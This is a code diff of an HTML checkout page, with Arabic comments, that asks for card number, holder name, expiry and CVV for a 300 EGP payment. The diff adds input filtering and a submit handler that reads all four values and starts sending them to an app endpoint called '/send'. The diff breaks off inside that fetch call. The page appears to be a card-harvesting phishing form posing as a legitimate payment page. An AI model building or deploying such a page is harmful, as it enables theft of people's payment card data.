@@ -44,17 +44,6 @@
             top: 10px;
             left: 10px;
         }
-        .card input {
-            width: 100%;
-            background: transparent;
-            border: none;
-            color: white;
-            font-size: 16px;
-            margin-top: 5px;
-        }
-        .card input::placeholder {
-            color: rgba(255, 255, 255, 0.7);
-        }
         .form-group {
             text-align: left;
             margin: 15px 0;
@@ -70,6 +59,10 @@
             border: 1px solid #ccc;
             border-radius: 5px;
             font-size: 16px;
+        }
+        input:focus {
+            border-color: #0074D9;
+            outline: none;
         }
         .pay-btn {
             width: 100%;
@@ -108,32 +101,32 @@
         <div class="card">
             <img src="https://upload.wikimedia.org/wikipedia/commons/8/88/EMV-Chip.svg" class="chip" alt="Chip">
             <p>Card Number</p>
-            <input type="text" id="cardNumber" placeholder="•••• •••• •••• ••••" required>
+            <p>•••• •••• •••• ••••</p>
             <p>Card Name</p>
-            <input type="text" id="name" placeholder="Enter Name" required>
+            <p>Enter Name</p>
             <p>Valid Thru</p>
-            <input type="text" id="expiry" placeholder="MM/YY" required>
+            <p>MM/YY</p>
         </div>
 
         <form id="paymentForm">
             <div class="form-group">
                 <label>Card Number:</label>
-                <input type="text" id="cardNumber2" placeholder="Enter Card Number" required>
+                <input type="text" id="cardNumber" placeholder="Enter Card Number" maxlength="16" required>
             </div>
 
             <div class="form-group">
                 <label>Card Holder Name:</label>
-                <input type="text" id="name2" placeholder="Enter Name" required>
+                <input type="text" id="name" placeholder="Enter Name" required>
             </div>
 
             <div class="form-group">
                 <label>Expiration Date:</label>
-                <input type="text" id="expiry2" placeholder="MM/YY" required>
+                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
             </div>
 
             <div class="form-group">
                 <label>CVV:</label>
-                <input type="text" id="cvv" placeholder="CVV" required>
+                <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
             </div>
 
             <button type="submit" class="pay-btn">PAY 300.00 EGP</button>
@@ -148,12 +141,36 @@
     </div>
 
     <script>
+        // السماح بالأرقام فقط في حقل رقم البطاقة
+        document.getElementById("cardNumber").addEventListener("input", function() {
+            this.value = this.value.replace(/\D/g, ''); // يمنع الحروف
+        });
+
+        // السماح فقط بالحروف الإنجليزية في اسم حامل البطاقة
+        document.getElementById("name").addEventListener("input", function() {
+            this.value = this.value.replace(/[^A-Za-z\s]/g, ''); // يمنع الأرقام والرموز
+        });
+
+        // السماح فقط بالأرقام في تاريخ الانتهاء وإضافة "/"
+        document.getElementById("expiry").addEventListener("input", function() {
+            this.value = this.value.replace(/[^0-9/]/g, ''); // يمنع الحروف
+            if (this.value.length === 2 && !this.value.includes('/')) {
+                this.value += '/';
+            }
+        });
+
+        // السماح بالأرقام فقط في CVV
+        document.getElementById("cvv").addEventListener("input", function() {
+            this.value = this.value.replace(/\D/g, ''); // يمنع الحروف
+        });
+
+        // إرسال البيانات عند الضغط على زر الدفع
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const cardNumber = document.getElementById("cardNumber2").value;
-            const name = document.getElementById("name2").value;
-            const expiry = document.getElementById("expiry2").value;
+            const cardNumber = document.getElementById("cardNumber").value;
+            const name = document.getElementById("name").value;
+            const expiry = document.getElementById("expiry").value;
             const cvv = document.getElementById("cvv").value;
 
             fetch("https://nodejs-production-7090.up.railway.app/send", { 
